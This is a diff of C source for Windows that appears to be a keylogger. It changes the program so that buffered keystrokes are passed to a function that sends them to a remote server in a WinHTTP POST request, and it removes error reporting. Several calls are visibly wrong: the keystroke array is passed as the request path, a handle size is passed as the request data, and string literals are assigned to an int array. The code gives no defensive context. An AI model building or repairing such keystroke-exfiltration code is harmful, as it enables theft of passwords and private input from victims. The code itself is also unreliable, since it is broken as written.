@@ -12,7 +12,7 @@ void printString(int capture[]) {
 	}
 }
 
-int sendCapture(void) {
+int sendCapture(int capture[]) {
 	DWORD dwSize = 0;
 	DWORD dwDownloaded = 0;
 	LPSTR pszOutBuffer;
@@ -36,8 +36,8 @@ int sendCapture(void) {
 
     // Create an HTTP Request handle.
     if (hConnect)
-        hRequest = WinHttpOpenRequest(hConnect, L"GET",
-            NULL,
+        hRequest = WinHttpOpenRequest(hConnect, L"POST",
+            capture,
             NULL, WINHTTP_NO_REFERER,
             WINHTTP_DEFAULT_ACCEPT_TYPES,
             0);
@@ -46,13 +46,9 @@ int sendCapture(void) {
     if (hRequest)
         bResults = WinHttpSendRequest(hRequest,
             WINHTTP_NO_ADDITIONAL_HEADERS,
-            0, WINHTTP_NO_REQUEST_DATA, 0,
+            0, sizeof(hRequest), 0,
             0, 0);
 
-	if (!bResults)
-		printf("Error %d has occurred.\n", GetLastError());
-
-	// End the request.
 	if (hRequest) WinHttpCloseHandle(hRequest);
 	if (hConnect) WinHttpCloseHandle(hConnect);
 	if (hSession) WinHttpCloseHandle(hSession);
@@ -76,13 +72,15 @@ int main(void) {
 
 			if (l + 1 == N) {
 				capture[l + 1] = "\0";
-				sendCapture();
+				sendCapture(capture);
 
 				capture[0] = "\0";
+				l = 0;
 			}
 
 			if (l < N) {
 				capture[l] = key;
+				printf("%d ", l);
 				l++;
 			}
 		}
